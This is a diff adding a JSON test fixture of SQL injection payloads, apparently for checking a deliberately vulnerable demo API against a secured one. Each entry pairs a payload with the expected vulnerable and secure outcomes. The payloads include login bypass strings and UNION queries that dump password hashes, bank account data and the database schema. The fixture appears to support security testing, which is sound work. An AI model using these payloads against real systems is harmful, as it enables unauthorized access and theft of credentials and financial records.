@@ -1,0 +1,72 @@
+{
+  "auth_bypass_payloads": [
+    {
+      "name": "Classic OR 1=1 comment bypass",
+      "payload": "admin' OR '1'='1' --",
+      "vector": "Authentication Bypass",
+      "target_endpoint": "/api/vulnerable/login",
+      "expected_vulnerable_result": "authenticated_as_admin",
+      "expected_secure_result": "blocked_or_rejected"
+    },
+    {
+      "name": "Single Quote OR True bypass",
+      "payload": "' OR 1=1 /*",
+      "vector": "Authentication Bypass",
+      "target_endpoint": "/api/vulnerable/login",
+      "expected_vulnerable_result": "authenticated_as_admin",
+      "expected_secure_result": "blocked_or_rejected"
+    },
+    {
+      "name": "Admin specific comment bypass",
+      "payload": "admin' --",
+      "vector": "Authentication Bypass",
+      "target_endpoint": "/api/vulnerable/login",
+      "expected_vulnerable_result": "authenticated_as_admin",
+      "expected_secure_result": "blocked_or_rejected"
+    }
+  ],
+  "union_extraction_payloads": [
+    {
+      "name": "UNION User Hash Extraction",
+      "payload": "' UNION SELECT 99, username || ':' || password_hash, role, 0.00, 1, email, 0 FROM users --",
+      "vector": "UNION-Based Data Extraction",
+      "target_endpoint": "/api/vulnerable/search",
+      "expected_vulnerable_result": "dumps_user_hashes",
+      "expected_secure_result": "zero_matches_or_literal"
+    },
+    {
+      "name": "UNION Financial Account Theft",
+      "payload": "' UNION SELECT 99, account_number, account_type, balance, 1, ssn_last4, 0 FROM accounts --",
+      "vector": "UNION-Based Data Extraction",
+      "target_endpoint": "/api/vulnerable/search",
+      "expected_vulnerable_result": "dumps_financial_records",
+      "expected_secure_result": "zero_matches_or_literal"
+    },
+    {
+      "name": "UNION SQLite Master Schema Extraction",
+      "payload": "' UNION SELECT 99, tbl_name, sql, 0.00, 1, 'schema', 0 FROM sqlite_master WHERE type='table' --",
+      "vector": "Schema Enumeration",
+      "target_endpoint": "/api/vulnerable/search",
+      "expected_vulnerable_result": "dumps_table_schemas",
+      "expected_secure_result": "zero_matches_or_literal"
+    }
+  ],
+  "numeric_and_error_payloads": [
+    {
+      "name": "Numeric Tautology ID Injection",
+      "payload": "1 OR 1=1",
+      "vector": "Numeric SQL Injection",
+      "target_endpoint": "/api/vulnerable/user/1 OR 1=1",
+      "expected_vulnerable_result": "dumps_all_users",
+      "expected_secure_result": "validation_error_blocked"
+    },
+    {
+      "name": "SQL Syntax Error Inducer",
+      "payload": "1' AND (SELECT 1 FROM non_existent_table) --",
+      "vector": "Error-Based SQL Injection",
+      "target_endpoint": "/api/vulnerable/user/1'",
+      "expected_vulnerable_result": "raw_sql_error_disclosure",
+      "expected_secure_result": "validation_error_blocked"
+    }
+  ]
+}
